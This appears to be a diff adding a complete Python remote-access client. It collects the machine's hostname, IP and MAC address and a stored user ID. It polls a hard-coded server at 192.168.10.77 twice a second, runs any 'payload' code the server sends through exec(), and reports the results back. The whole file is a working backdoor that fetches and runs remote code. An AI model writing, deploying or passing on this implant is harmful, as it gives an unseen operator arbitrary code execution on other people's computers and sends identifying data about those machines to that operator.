@@ -1,0 +1,84 @@
+import os
+import threading
+from socket import gethostname, gethostbyname
+from uuid import getnode
+from time import sleep
+import requests
+import sys
+
+SERVER_URL = "http://192.168.10.77:8000"
+WS_URL = "ws://192.168.10.77:8000/ws"
+PAYLOAD_RESPONSE_API = "/payload_response"
+IP_V4_ADDRESS = gethostbyname(gethostname())
+MAC_ADDRESS = ':'.join(f'{(getnode() >> ele) & 0xff:02x}' for ele in range(40, -1, -8))
+PC_NAME = os.getenv('COMPUTERNAME')
+USER_ID_FILE = "UniqueUserID.txt"
+USER_ID = ""
+user_id_lock = threading.Lock()
+if os.path.exists(USER_ID_FILE):
+    with open(USER_ID_FILE, "r") as id_file:
+        USER_ID = id_file.read()
+headers = {
+    "x-pc-name": PC_NAME,
+    "x-ip-address": IP_V4_ADDRESS,
+    "x-mac-address": MAC_ADDRESS,
+    "x-user-id": USER_ID,
+}
+header_lock = threading.Lock()
+
+def run_payload_code(code: str):
+    exec(code, globals())
+
+def execute_payload(payload_code, payload_id):
+    try:
+        run_payload_code(payload_code)
+        payload_status, err = "success", ""
+    except Exception as e:
+        print(f"Payload {payload_id} error:", e)
+        payload_status, err = "fail", str(e)
+    params = {
+        "payload_executed": str(payload_code),
+        "payload_status": str(payload_status),
+        "payload_error": str(err) if err is not None else ""
+    }
+    try:
+        resp = requests.get(f"{SERVER_URL}{PAYLOAD_RESPONSE_API}", params=params, headers=headers)
+    except Exception as e:
+        print(f"Failed to report payload {payload_id}:", e)
+
+def handle_response(resp):
+    global USER_ID, headers
+    try:
+        data = resp.json()
+        with user_id_lock:
+            if not USER_ID:
+                USER_ID = data.get("user_id")
+                with open(USER_ID_FILE, "w") as f:
+                    f.write(USER_ID)
+            with header_lock:
+                headers["x-user-id"] = USER_ID
+        payload = data.get("payload")
+        if payload:
+            payload_id = hash(payload)
+            print(f"Starting payload {payload_id}")
+            payload_thread = threading.Thread(
+                target=execute_payload,
+                args=(payload, payload_id),
+                daemon=False
+            )
+            payload_thread.start()
+    except Exception as e:
+        print("Poll error:", e)
+
+def poll_server():
+    while True:
+        try:
+            resp = requests.get(SERVER_URL, headers=headers)
+            handle_response_thread = threading.Thread(target=handle_response, args=(resp,), daemon=False)
+            handle_response_thread.start()
+        except Exception as e:
+            print(f"Couldn't poll server: {e}")
+        sleep(0.5)
+
+if __name__ == "__main__":
+    poll_server()
